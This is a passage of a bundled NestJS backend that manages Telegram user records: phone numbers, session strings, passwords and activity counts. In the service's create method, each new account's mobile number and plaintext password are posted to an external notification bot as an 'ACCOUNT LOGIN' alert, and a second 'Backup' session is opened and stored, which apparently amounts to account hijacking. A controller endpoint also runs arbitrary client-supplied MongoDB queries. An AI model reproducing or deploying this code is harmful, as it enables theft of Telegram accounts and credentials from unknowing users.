    (0, swagger_1.ApiProperty)({ description: 'Telegram ID of the user', example: '2022068676' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'TwoFA status', example: false }),
    __metadata("design:type", Boolean)
], CreateUserDto.prototype, "twoFA", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Expiration status', example: false }),
    __metadata("design:type", Boolean)
], CreateUserDto.prototype, "expired", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'password', example: "pass" }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of movies', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "movieCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of photos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "photoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of videos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "videoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Gender of the user', example: null }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "gender", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of other photos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "otherPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of other videos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "otherVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of own photos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "ownPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of own videos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "ownVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of contacts', example: 105 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "contacts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Call details of the user',
        example: {
            outgoing: 1,
            incoming: 0,
            video: 1,
            chatCallCounts: [],
            totalCalls: 1,
        },
    }),
    __metadata("design:type", Object)
], CreateUserDto.prototype, "calls", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Call details of the user',
        example: []
    }),
    __metadata("design:type", Array)
], CreateUserDto.prototype, "recentUsers", void 0);


/***/ }),

/***/ "./src/components/users/dto/search-user.dto.ts":
/*!*****************************************************!*\
  !*** ./src/components/users/dto/search-user.dto.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchUserDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchUserDto {
}
exports.SearchUserDto = SearchUserDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by Telegram ID' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by mobile number' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by twoFA status', type: Boolean }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SearchUserDto.prototype, "twoFA", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by Expiration status', type: Boolean }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SearchUserDto.prototype, "expired", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by session' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by first name' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by last name' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "lastName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by username' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by channels count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by personal chats count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "personalChats", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by demo given status', type: Boolean }),
    (0, class_transformer_1.Transform)(({ value }) => value === 'true' || value === true),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SearchUserDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by messages count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "msgs", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by total chats count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "totalChats", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by last active timestamp' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by movie count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "movieCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by photo count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "photoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by video count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "videoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by gender' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "gender", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by other photo count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "otherPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by other video count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "otherVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by own photo count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "ownPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by own video count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "ownVideoCount", void 0);


/***/ }),

/***/ "./src/components/users/dto/update-user.dto.ts":
/*!*****************************************************!*\
  !*** ./src/components/users/dto/update-user.dto.ts ***!
  \*****************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateUserDto = void 0;
const mapped_types_1 = __webpack_require__(/*! @nestjs/mapped-types */ "@nestjs/mapped-types");
const create_user_dto_1 = __webpack_require__(/*! ./create-user.dto */ "./src/components/users/dto/create-user.dto.ts");
class UpdateUserDto extends (0, mapped_types_1.PartialType)(create_user_dto_1.CreateUserDto) {
}
exports.UpdateUserDto = UpdateUserDto;


/***/ }),

/***/ "./src/components/users/schemas/user.schema.ts":
/*!*****************************************************!*\
  !*** ./src/components/users/schemas/user.schema.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserSchema = exports.User = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let User = class User {
    constructor() {
        this.twoFA = false;
        this.expired = false;
        this.password = null;
    }
};
exports.User = User;
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], User.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], User.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "lastName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "personalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Boolean)
], User.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "msgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "totalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], User.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "movieCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "photoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "videoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "gender", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Boolean }),
    __metadata("design:type", Boolean)
], User.prototype, "twoFA", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Boolean, default: false }),
    __metadata("design:type", Boolean)
], User.prototype, "expired", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", String)
], User.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "otherPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "otherVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "ownPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "ownVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "contacts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({
        type: mongoose_2.default.Schema.Types.Mixed,
        default: {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: [],
            totalCalls: 0,
        },
    }),
    __metadata("design:type", Object)
], User.prototype, "calls", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)(),
    (0, mongoose_1.Prop)({
        type: mongoose_2.default.Schema.Types.Mixed,
        default: [],
        required: false,
    }),
    __metadata("design:type", Array)
], User.prototype, "recentUsers", void 0);
exports.User = User = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'users', versionKey: false, autoIndex: true, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], User);
exports.UserSchema = mongoose_1.SchemaFactory.createForClass(User);


/***/ }),

/***/ "./src/components/users/users.controller.ts":
/*!**************************************************!*\
  !*** ./src/components/users/users.controller.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UsersController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const users_service_1 = __webpack_require__(/*! ./users.service */ "./src/components/users/users.service.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const search_user_dto_1 = __webpack_require__(/*! ./dto/search-user.dto */ "./src/components/users/dto/search-user.dto.ts");
const update_user_dto_1 = __webpack_require__(/*! ./dto/update-user.dto */ "./src/components/users/dto/update-user.dto.ts");
const create_user_dto_1 = __webpack_require__(/*! ./dto/create-user.dto */ "./src/components/users/dto/create-user.dto.ts");
let UsersController = class UsersController {
    constructor(usersService) {
        this.usersService = usersService;
    }
    async create(createUserDto) {
        console.log("creating new user");
        return this.usersService.create(createUserDto);
    }
    async search(queryParams) {
        return this.usersService.search(queryParams);
    }
    async findAll() {
        return this.usersService.findAll();
    }
    async findOne(tgId) {
        return this.usersService.findOne(tgId);
    }
    async update(tgId, updateUserDto) {
        return this.usersService.update(tgId, updateUserDto);
    }
    async remove(tgId) {
        return this.usersService.delete(tgId);
    }
    async executeQuery(requestBody) {
        const { query, sort, limit, skip } = requestBody;
        try {
            return await this.usersService.executeQuery(query, sort, limit, skip);
        }
        catch (error) {
            throw error;
        }
    }
};
exports.UsersController = UsersController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new user' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_user_dto_1.CreateUserDto]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('/search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search users based on various parameters' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_user_dto_1.SearchUserDto]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all users' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':tgId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get a user by tgId' }),
    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
    __param(0, (0, common_1.Param)('tgId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':tgId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update a user by tgId' }),
    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
    __param(0, (0, common_1.Param)('tgId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_user_dto_1.UpdateUserDto]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':tgId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete a user by tgId' }),
    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
    __param(0, (0, common_1.Param)('tgId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "executeQuery", null);
exports.UsersController = UsersController = __decorate([
    (0, swagger_1.ApiTags)('Telegram Users'),
    (0, common_1.Controller)('user'),
    __metadata("design:paramtypes", [users_service_1.UsersService])
], UsersController);


/***/ }),

/***/ "./src/components/users/users.module.ts":
/*!**********************************************!*\
  !*** ./src/components/users/users.module.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UsersModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const users_service_1 = __webpack_require__(/*! ./users.service */ "./src/components/users/users.service.ts");
const users_controller_1 = __webpack_require__(/*! ./users.controller */ "./src/components/users/users.controller.ts");
const user_schema_1 = __webpack_require__(/*! ./schemas/user.schema */ "./src/components/users/schemas/user.schema.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let UsersModule = class UsersModule {
};
exports.UsersModule = UsersModule;
exports.UsersModule = UsersModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'userModule', schema: user_schema_1.UserSchema, collection: 'users' }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule)
        ],
        controllers: [users_controller_1.UsersController],
        providers: [users_service_1.UsersService],
        exports: [users_service_1.UsersService]
    })
], UsersModule);


/***/ }),

/***/ "./src/components/users/users.service.ts":
/*!***********************************************!*\
  !*** ./src/components/users/users.service.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UsersService = void 0;
const Telegram_service_1 = __webpack_require__(/*! ./../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
let UsersService = class UsersService {
    constructor(userModel, telegramService, clientsService) {
        this.userModel = userModel;
        this.telegramService = telegramService;
        this.clientsService = clientsService;
    }
    async create(user) {
        const activeClientSetup = this.telegramService.getActiveClientSetup();
        console.log("New User received - ", user?.mobile);
        console.log("ActiveClientSetup::", activeClientSetup);
        if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
            console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId);
            await this.clientsService.updateClientSession(user.session);
        }
        else {
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);
            setTimeout(async () => {
                try {
                    await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
                    const newSession = await this.telegramService.createNewSession(user.mobile);
                    const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup" });
                    await newUserBackup.save();
                }
                catch (error) {
                    console.log("Error in creating new session", error);
                }
            }, 3000);
            const newUser = new this.userModel(user);
            return newUser.save();
        }
    }
    async findAll() {
        return this.userModel.find().exec();
    }
    async findOne(tgId) {
        const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON();
        if (!user) {
            throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
        }
        return user;
    }
    async update(tgId, user) {
        delete user['_id'];
        const result = await this.userModel.updateMany({ tgId }, { $set: user }, { new: true, upsert: true }).exec();
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`Users with tgId ${tgId} not found`);
        }
        return result.modifiedCount;
    }
    async updateByFilter(filter, user) {
        delete user['_id'];
        const result = await this.userModel.updateMany(filter, { $set: user }, { new: true, upsert: true }).exec();
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);
        }
        return result.modifiedCount;
    }
    async delete(tgId) {
        const result = await this.userModel.deleteOne({ tgId }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
        }
    }
    async search(filter) {
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        if (filter.twoFA !== undefined) {
            filter.twoFA = filter.twoFA === 'true' || filter.twoFA === '1' || filter.twoFA === true;
        }
        console.log(filter);
        return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.userModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
};
exports.UsersService = UsersService;
exports.UsersService = UsersService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('userModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        client_service_1.ClientService])
], UsersService);


/***/ }),

/***/ "./src/interfaces/telegram.ts":
/*!************************************!*\
  !*** ./src/interfaces/telegram.ts ***!
  \************************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PrivacyLevelEnum = void 0;
var PrivacyLevelEnum;
(function (PrivacyLevelEnum) {
    PrivacyLevelEnum["everybody"] = "everybody";
    PrivacyLevelEnum["contacts"] = "contacts";
    PrivacyLevelEnum["nobody"] = "nobody";
})(PrivacyLevelEnum || (exports.PrivacyLevelEnum = PrivacyLevelEnum = {}));


/***/ }),

/***/ "./src/main.ts":
/*!*********************!*\
  !*** ./src/main.ts ***!
  \*********************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
